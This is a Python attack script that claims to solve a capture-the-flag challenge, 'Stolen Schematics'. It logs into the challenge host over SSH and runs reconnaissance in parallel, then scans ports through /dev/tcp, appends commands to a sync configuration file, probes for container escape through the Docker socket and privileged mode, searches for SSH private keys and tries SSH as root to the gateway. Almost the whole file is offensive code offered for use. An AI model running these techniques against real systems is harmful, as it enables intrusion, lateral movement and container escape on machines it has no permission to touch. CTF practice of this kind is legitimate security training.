#!/usr/bin/env python3
"""
Stolen Schematics - ULTIMATE FAST SOLVER
Time-optimized multi-threaded approach
"""

import paramiko
import time
import threading
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = "instance.ctf.tdho.st"
PORT = 32881
USERNAME = "player"
PASSWORD = "reyalp"

results = {}
flag_found = threading.Event()

def ssh_connect():
    """Establish SSH connection"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, timeout=10)
    return client

def exec_cmd(client, cmd, timeout=30):
    """Execute command and return output"""
    try:
        stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        return stdout.read().decode() + stderr.read().decode()
    except:
        return ""

def quick_flag_check(client):
    """Check all obvious flag locations"""
    print("[*] Quick flag check...")
    locations = [
        "cat /etc/flag.txt",
        "cat flag.txt",
        "cat ~/flag.txt",
        "cat /flag.txt",
        "find / -name flag.txt 2>/dev/null",
        "find / -name '*flag*' 2>/dev/null | head -20"
    ]
    for cmd in locations:
        out = exec_cmd(client, cmd)
        if "TDHT{" in out:
            print(f"\n[!!!] FLAG FOUND: {out}")
            results['flag'] = out
            flag_found.set()
            return True
    return False

def container_recon(client):
    """Fast container reconnaissance"""
    if flag_found.is_set():
        return
    
    print("[*] Container recon...")
    cmds = {
        'hostname': 'hostname; hostname -I',
        'user': 'id; whoami',
        'caps': 'capsh --print 2>/dev/null || echo "No caps"',
        'mounts': 'df -h; mount | grep -i docker',
        'processes': 'ps aux | grep -E "root|sync"',
        'network': 'ip addr; ip route',
        'writable': 'find /opt -writable 2>/dev/null | head -20',
        'sync_config': 'cat /opt/mc/config/sync-request.conf 2>/dev/null'
    }
    
    for name, cmd in cmds.items():
        out = exec_cmd(client, cmd)
        results[name] = out
        print(f"  [{name}] {out[:200]}")

def network_scan(client):
    """Scan Docker network for other hosts"""
    if flag_found.is_set():
        return
    
    print("[*] Network scanning...")
    
    # Get gateway
    gateway_out = exec_cmd(client, "ip route | grep default | awk '{print $3}'")
    gateway = gateway_out.strip()
    print(f"  [Gateway] {gateway}")
    
    # Quick port scan of gateway
    ports = [22, 80, 8080, 443, 25565, 3000, 5000, 8000]
    open_ports = []
    
    for port in ports:
        out = exec_cmd(client, f"timeout 2 bash -c 'echo >/dev/tcp/{gateway}/{port}' 2>/dev/null && echo 'OPEN' || echo 'CLOSED'", timeout=5)
        if "OPEN" in out:
            open_ports.append(port)
            print(f"    [{gateway}:{port}] OPEN")
    
    results['gateway'] = gateway
    results['open_ports'] = open_ports
    
    # Try HTTP on open ports
    for port in [80, 8080, 443, 3000, 5000, 8000]:
        if port in open_ports:
            out = exec_cmd(client, f"curl -s -m 3 http://{gateway}:{port}/ 2>/dev/null | head -20")
            if out and len(out) > 10:
                print(f"    [HTTP {port}] {out[:100]}")
                results[f'http_{port}'] = out

def find_ghcr_image():
    """Research GHCR registry for public images"""
    if flag_found.is_set():
        return
    
    print("[*] Searching GHCR registry...")
    
    org = "talldwarfhosting"
    image_names = [
        "mc-server", "minecraft-server", "game-server", 
        "stolen-schematics", "mc", "server", "minecraft",
        "ctf-server", "challenge", "tdh-server"
    ]
    
    for img in image_names:
        try:
            # Try to list tags
            cmd = f'curl -s https://ghcr.io/v2/{org}/{img}/tags/list'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and "tags" in result.stdout:
                print(f"  [FOUND] {org}/{img}")
                print(f"    {result.stdout[:200]}")
                results[f'ghcr_{img}'] = result.stdout
        except:
            pass

def try_sync_exploit(client):
    """Attempt to exploit sync mechanism"""
    if flag_found.is_set():
        return
    
    print("[*] Trying sync exploits...")
    
    exploits = [
        # Command injection in config
        'echo "command=cat /etc/flag.txt" >> /opt/mc/config/sync-request.conf',
        'echo "exec=cat /flag.txt" >> /opt/mc/config/sync-request.conf',
        
        # Create malicious script
        'echo "#!/bin/bash\ncat /etc/flag.txt\ncat /flag.txt" > /tmp/exploit.sh && chmod +x /tmp/exploit.sh',
        
        # Try to write to sync locations
        'echo "flag_please" > /opt/mc/.sync/request 2>/dev/null',
        'echo "cat /etc/flag.txt" > /opt/mc/config/command.txt 2>/dev/null'
    ]
    
    for exploit in exploits:
        exec_cmd(client, exploit)
        time.sleep(0.5)
        
        # Check for flag
        if quick_flag_check(client):
            return

def try_docker_escape(client):
    """Try various container escape techniques"""
    if flag_found.is_set():
        return
    
    print("[*] Trying escape techniques...")
    
    # Check for docker socket
    out = exec_cmd(client, "ls -la /var/run/docker.sock 2>/dev/null")
    if "docker.sock" in out:
        print("  [!] Docker socket accessible!")
        results['docker_socket'] = True
    
    # Check for privileged mode
    out = exec_cmd(client, "fdisk -l 2>/dev/null")
    if "Disk /dev/" in out:
        print("  [!] Can see host devices - privileged?")
        results['privileged'] = True
    
    # Try to access host via sync volume
    cmds = [
        "ls -la /opt/mc/.sync/ 2>/dev/null",
        "find /opt/mc/.sync -type f 2>/dev/null | xargs cat 2>/dev/null",
        "cat /opt/mc/.sync/* 2>/dev/null"
    ]
    
    for cmd in cmds:
        out = exec_cmd(client, cmd)
        if "flag" in out.lower() or "TDHT{" in out:
            print(f"  [!!!] Potential flag in sync: {out[:200]}")
            results['sync_data'] = out

def check_github_org():
    """Check GitHub for hints"""
    if flag_found.is_set():
        return
    
    print("[*] Checking GitHub org...")
    
    try:
        # Check for repos
        cmd = 'curl -s https://api.github.com/orgs/TallDwarfHosting/repos'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            print(f"  [GitHub repos] {result.stdout[:300]}")
            results['github_repos'] = result.stdout
    except:
        pass

def try_ssh_to_other_hosts(client):
    """Try SSH to other hosts with common keys/passwords"""
    if flag_found.is_set():
        return
    
    print("[*] Trying SSH to other hosts...")
    
    gateway = results.get('gateway', '172.27.0.1')
    
    # Check for SSH keys in container
    keys_out = exec_cmd(client, "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null")
    if keys_out:
        print(f"  [!] Found SSH keys: {keys_out}")
        results['ssh_keys'] = keys_out
    
    # Try to SSH to gateway with found keys or password
    ssh_attempts = [
        f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 player@{gateway} 'cat /etc/flag.txt' 2>&1",
        f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@{gateway} 'cat /etc/flag.txt' 2>&1",
    ]
    
    for attempt in ssh_attempts:
        out = exec_cmd(client, attempt)
        if "TDHT{" in out:
            print(f"  [!!!] FLAG via SSH: {out}")
            results['flag'] = out
            flag_found.set()
            return

def monitor_for_changes(client):
    """Monitor file system for changes after exploits"""
    if flag_found.is_set():
        return
    
    print("[*] Monitoring for changes...")
    
    time.sleep(3)  # Wait for sync to trigger
    
    # Check common output locations
    locations = [
        "/tmp/flag*",
        "/tmp/output*",
        "/opt/mc/logs/latest.log",
        "/opt/mc/.sync/*",
        "/home/player/*"
    ]
    
    for loc in locations:
        out = exec_cmd(client, f"cat {loc} 2>/dev/null")
        if "TDHT{" in out:
            print(f"  [!!!] FLAG in {loc}: {out}")
            results['flag'] = out
            flag_found.set()
            return

def main():
    print(f"""
╔═══════════════════════════════════════════════════════╗
║     STOLEN SCHEMATICS - ULTIMATE FAST SOLVER          ║
║     Time Remaining: ~9 minutes                        ║
╚═══════════════════════════════════════════════════════╝
    """)
    
    start_time = time.time()
    
    try:
        # Connect
        print(f"[*] Connecting to {HOST}:{PORT}...")
        client = ssh_connect()
        print("[+] Connected!")
        
        # Quick flag check first
        if quick_flag_check(client):
            print("\n[SUCCESS] Flag found immediately!")
            return
        
        # Run all attacks in parallel
        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = []
            
            futures.append(executor.submit(container_recon, client))
            futures.append(executor.submit(network_scan, client))
            futures.append(executor.submit(find_ghcr_image))
            futures.append(executor.submit(check_github_org))
            futures.append(executor.submit(try_sync_exploit, client))
            futures.append(executor.submit(try_docker_escape, client))
            futures.append(executor.submit(try_ssh_to_other_hosts, client))
            
            # Wait for all to complete or flag found
            for future in as_completed(futures):
                if flag_found.is_set():
                    break
                try:
                    future.result(timeout=30)
                except Exception as e:
                    print(f"  [!] Thread error: {e}")
        
        # Final monitoring check
        if not flag_found.is_set():
            monitor_for_changes(client)
        
        # Final desperate checks
        if not flag_found.is_set():
            print("\n[*] Final desperate attempts...")
            
            # Check all files recursively for TDHT{
            out = exec_cmd(client, "grep -r 'TDHT{' / 2>/dev/null | head -5", timeout=45)
            if "TDHT{" in out:
                print(f"[!!!] FLAG FOUND via grep: {out}")
                results['flag'] = out
                flag_found.set()
        
        # Print summary
        print("\n" + "="*60)
        print("RESULTS SUMMARY:")
        print("="*60)
        
        if flag_found.is_set():
            print(f"\n🚩 FLAG: {results.get('flag', 'See above')}")
        else:
            print("\n[!] Flag not found yet. Key findings:")
            for key, value in results.items():
                if value and len(str(value)) > 10:
                    print(f"\n[{key}]:")
                    print(str(value)[:300])
        
        elapsed = time.time() - start_time
        print(f"\n[*] Elapsed time: {elapsed:.1f}s")
        
        client.close()
        
    except Exception as e:
        print(f"\n[ERROR] {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
